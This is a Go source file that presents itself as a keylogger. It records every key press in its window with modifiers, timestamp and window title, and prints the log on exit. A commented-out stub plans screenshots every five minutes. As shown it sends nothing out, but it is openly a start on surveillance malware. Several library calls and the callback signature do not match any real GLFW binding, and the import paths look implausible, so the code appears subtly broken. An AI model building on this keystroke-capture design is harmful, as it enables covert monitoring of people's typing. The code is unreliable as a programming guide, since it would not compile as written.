package main

import (
	"fmt"
	"github.com/AllenDowney/go-tf/glfw"
	"github.com/kardianQ/goutil/keyboard"
	"time"
)

var (
	data     []map[string]interface{}
	startTime *time.Time
)

func getKeyModifiers(modifiers []glfw.Modifier) []string {
	var modStrings []string
	for _, mod := range modifiers {
		switch mod {
		case glfw.ModShift:
			modStrings = append(modStrings, "shift")
		case glfw.ModControl:
			modStrings = append(modStrings, "ctrl")
		case glfw.ModAlt:
			modStrings = append(modStrings, "alt")
		}
	}
	return modStrings
}

func onKeyPress(key glfw.Key, scancode int, modifiers []glfw.Modifier, pressed bool) {
	if !pressed {
		return
	}

	now := time.Now()
	keyString := keyboard.Key(key).String()

	if startTime == nil {
		startTime = &now
	}

	windowTitle, err := glfw.GetWindowTitle(glfw.GetCurrentContext())
	if err != nil {
		fmt.Println("Error getting window title:", err)
		return
	}

	data = append(data, map[string]interface{}{
		"time":       now,
		"key":        keyString,
		"modifiers":  getKeyModifiers(modifiers),
		"windowTitle": windowTitle,
	})

	// Implement logic for taking screenshots every 5 minutes (commented out)
	/*
	if elapsed := now.Sub(*startTime); elapsed.Seconds() >= 300 {
		// Take screenshot here
		fmt.Println("Taking screenshot...")
		startTime = nil
	}
	*/
}

func main() {
	if err := glfw.Init(); err != nil {
		panic(err)
	}
	defer glfw.Terminate()

	window, err := glfw.CreateWindow(800, 600, "Keylogger", nil, nil)
	if err != nil {
		panic(err)
	}
	defer glfw.DestroyWindow(window)

	glfw.MakeContextCurrent(window)

	keyboard.CallbackOn(window, onKeyPress)

	for !glfw.WindowShouldClose(window) {
		glfw.PollEvents()
		glfw.SwapBuffers(window)
	}

	fmt.Println("Keylogging data:")
	for _, entry := range data {
		fmt.Println(entry)
	}
}